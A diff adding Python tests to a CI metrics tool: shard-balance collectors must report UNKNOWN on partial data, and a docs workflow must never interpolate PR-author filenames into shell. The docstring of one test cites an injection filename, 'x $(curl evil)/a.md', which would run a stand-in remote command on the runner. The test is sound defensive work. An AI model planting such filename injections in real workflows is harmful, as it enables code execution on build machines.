@@ -2127,6 +2127,10 @@ def test_report_does_not_launder_a_failed_collector(monkeypatch):
     assert report["fast_files_unclassified"] is mt.UNKNOWN
     assert report["durations_map"]["sampled_keys"] is mt.UNKNOWN
     assert report["shard_imbalance_minutes"] is mt.UNKNOWN
+    # #6135: the newly surfaced critical-path metric must not be laundered
+    # either — a failed collector leaves it UNKNOWN, not 0.
+    assert report["max_shard_minutes"] is mt.UNKNOWN
+    assert report["shard_count"] is mt.UNKNOWN
     assert report["legs"] is mt.UNKNOWN
     assert report["diverged"] is None
 
@@ -3602,6 +3606,10 @@ def test_job_wall_seconds_defers_to_the_jobs_api_timestamps():
 def test_collect_shard_balance_uses_observed_wall_time(monkeypatch):
     import ci_timing
 
+    # #6135: the collector refuses a family that is not the CONFIGURED shard
+    # set, so this unit test states the set it is exercising (two legs) rather
+    # than depending on the repo's current `fast_shards`.
+    monkeypatch.setattr(mt, "_configured_shard_set", lambda: {"a", "b"})
     monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
     monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
         {"name": "test (a)", "conclusion": "success",
@@ -3622,6 +3630,7 @@ def test_collect_shard_balance_uses_observed_wall_time(monkeypatch):
 def test_collect_shard_balance_requires_both_legs(monkeypatch):
     import ci_timing
 
+    monkeypatch.setattr(mt, "_configured_shard_set", lambda: {"a", "b"})
     monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
     monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
         {"name": "test (a)", "conclusion": "success",
@@ -3629,6 +3638,57 @@ def test_collect_shard_balance_requires_both_legs(monkeypatch):
          "completed_at": "2026-09-27T16:36:30Z"},
     ])
     assert mt.collect_shard_balance() == {}
+
+
+def test_collect_shard_balance_refuses_a_partial_family(monkeypatch):
+    """#6135: a truncated Jobs-API read must be UNKNOWN, not a measurement
+    taken over 2 of the configured 9 shards (that under-reports max(shard))."""
+    import ci_timing
+
+    monkeypatch.setattr(mt, "_configured_shard_set", lambda: set("abcdefghi"))
+    monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
+    monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
+        {"name": "test (a)", "conclusion": "success",
+         "started_at": "2026-09-27T16:00:00Z",
+         "completed_at": "2026-09-27T16:36:30Z"},
+        {"name": "test (b)", "conclusion": "success",
+         "started_at": "2026-09-27T16:00:00Z",
+         "completed_at": "2026-09-27T16:26:47Z"},
+    ])
+    assert mt.collect_shard_balance() == {}
+
+
+def test_collect_shard_balance_fails_closed_when_config_is_unreadable(monkeypatch):
+    """#6135: an UNREADABLE config must not skip the completeness check — that
+    would measure whatever page of jobs was fetched and under-report max(shard)
+    in exactly the degraded environment the guard exists for."""
+    import ci_timing
+
+    monkeypatch.setattr(mt, "_configured_shard_set", lambda: None)
+    monkeypatch.setattr(ci_timing, "pick_run", lambda repo: "4242")
+    monkeypatch.setattr(ci_timing, "fetch_jobs", lambda repo, run_id: [
+        {"name": "test (a)", "conclusion": "success",
+         "started_at": "2026-09-27T16:00:00Z",
+         "completed_at": "2026-09-27T16:36:30Z"},
+        {"name": "test (b)", "conclusion": "success",
+         "started_at": "2026-09-27T16:00:00Z",
+         "completed_at": "2026-09-27T16:26:47Z"},
+    ])
+    assert mt.collect_shard_balance() == {}
+
+
+def test_shard_balance_check_requires_every_observed_leg_green():
+    """#6135: the check must not validate two of nine shards. A 9-leg payload
+    with a red shard outside a/b is a coverage failure, not a pass."""
+    def leg(c):
+        return {"conclusion": c, "wall_seconds": 300.0}
+    nine = {ch: leg("success") for ch in "abcdefghi"}
+    ok = {"shard_imbalance_minutes": 0.0, "legs": nine}
+    assert mt.run_check("shard-balance", json=ok, max=3) == 0
+    red_i = dict(ok, legs=dict(nine, i=leg("failure")))
+    assert mt.run_check("shard-balance", json=red_i, max=3) == 2
+    red_c = dict(ok, legs=dict(nine, c=leg("skipped")))
+    assert mt.run_check("shard-balance", json=red_c, max=3) == 2
 
 
 def test_diverged_duration_keys_flags_only_observed_overshoot():
@@ -3833,6 +3893,107 @@ def test_docs_job_main_health_uses_a_safe_post_merge_gate():
     # A link-free markdown file is legitimate: the action's failIfEmpty default
     # (true) would red the nightly on common prose-only commits.
     assert link["with"].get("failIfEmpty") is False
+
+
+def test_docs_job_pr_path_never_interpolates_filenames():
+    """#4449: the PR path's changed-markdown list is DATA, never shell text.
+
+    The main-health path was fixed and pinned by
+    ``test_docs_job_main_health_uses_a_safe_post_merge_gate``. The PR path kept
+    ``${{ steps.changed.outputs.files }}`` interpolated into a ``run:`` AND into
+    lychee's ``args:``, and it stayed unreachable only because the PR checkout
+    was SHALLOW: with no ``github.event.pull_request.base.sha`` in the object
+    store the ``git diff`` failed, ``|| true`` swallowed it, the list came out
+    empty, and both consuming steps were skipped. That is an accident of the
+    checkout depth, not a control (#4449). Deepen the checkout and a list of
+    PR-AUTHOR-CONTROLLED filenames reaches a shell, where a path like
+    ``x $(curl evil)/a.md`` executes on the runner — including on a fork PR.
+
+    Both arms are pinned: the list is produced NUL-delimited into a FILE, and
+    each consumer reads that file (``xargs -0`` / ``--files-from``) instead of
+    receiving interpolated text.
+    """
+    steps = _load_workflow("ci.yml")["jobs"]["docs"]["steps"]
+
+    changed = next(s for s in steps if s.get("id") == "changed")
+    run = changed["run"]
+
+    def _logical(startswith: str) -> str:
+        """The shell logical line beginning with ``startswith``, comments stripped.
+
+        Assertions must target a SPECIFIC command: matching the whole ``run``
+        block lets an UNRELATED occurrence satisfy them, which is not a pin.
+        Measured on an earlier revision of this test — a bare ``"-z" in run``
+        was satisfied by the ``sed -z`` two lines later, and a bare
+        ``"|| true" in run`` by the ``grep -c . ... || true`` in the count
+        line, so deleting ``-z`` or the tolerance from the ``git diff`` left
+        the whole suite green. Command continuations (``\``) are joined.
+        """
+        code = [ln for ln in run.splitlines() if not ln.lstrip().startswith("#")]
+        for i, ln in enumerate(code):
+            if ln.strip().startswith(startswith):
+                parts, j = [], i
+                while j < len(code):
+                    parts.append(code[j].strip())
+                    if not code[j].rstrip().endswith("\\"):
+                        break
+                    j += 1
+                return " ".join(parts)
+        raise AssertionError(f"no shell command beginning {startswith!r} in run block")
+
+    diff_cmd = _logical("git diff")
+    # NUL-delimited output on the DIFF ITSELF (not the `sed -z` below it).
+    assert "-z" in diff_cmd, diff_cmd
+    assert "--name-only" in diff_cmd, diff_cmd
+    # Only paths that exist on disk: lychee hard-errors on a nonexistent input,
+    # and under `--no-renames` a rename contributes its deleted source path.
+    assert "--diff-filter ACMR" in diff_cmd, diff_cmd
+    # The tolerance, asserted ON THIS COMMAND. `docs` is a REQUIRED status
+    # check and a shallow PR checkout has no base sha, so without it git exits
+    # 128, the step aborts under `bash -e`, and every PR reds.
+    assert "|| :" in diff_cmd or diff_cmd.rstrip().endswith("|| true"), diff_cmd
+    assert "$RUNNER_TEMP/pr-md.raw.nul" in diff_cmd, diff_cmd
+
+    # The list is never published as step-output TEXT (a later `${{ ... }}`
+    # would re-parse the filenames as shell).
+    assert 'echo "files=' not in run, (
+        "the PR path must not publish the filenames as step OUTPUT text: a "
+        "later `${{ steps.changed.outputs.files }}` re-parses them as shell"
+    )
+    count_cmd = _logical("count=")
+    assert "pr-md.txt" in count_cmd, count_cmd
+
+    lint = next(
+        s for s in steps if str(s.get("name", "")) == "Markdownlint (changed files)"
+    )
+    assert "xargs -0" in lint["run"], (
+        "markdownlint must consume the NUL list as ARGV, not as expanded text"
+    )
+    assert "steps.changed.outputs.files" not in lint["run"]
+    assert "${{ steps.changed" not in lint["run"]
+
+    link = next(
+        s for s in steps if str(s.get("name", "")) == "Link check (changed files)"
+    )
+    assert "--files-from" in link["with"]["args"], (
+        "lychee must read the list from a FILE"
+    )
+    assert "steps.changed.outputs.files" not in link["with"]["args"]
+    assert "${{ steps.changed" not in link["with"]["args"]
+    # A link-free markdown file is legitimate.
+    assert link["with"].get("failIfEmpty") is False
+
+    # Both consumers must ALSO be guarded on the PR path: the main-health path
+    # sets no `changed` output, so an unguarded `count != '0'` would be TRUE on
+    # an empty count and run the step on the nightly with no list.
+    for step in (lint, link):
+        cond = str(step.get("if", ""))
+        assert "!inputs.main_health" in cond, (
+            f"{step.get('name')!r} must stay on the PR path only"
+        )
+        assert "count" in cond, (
+            f"{step.get('name')!r} must gate on the produced list, not on `files`"
+        )
 
 
 def test_main_health_nightly_calls_ci_yml_and_never_gates_main():
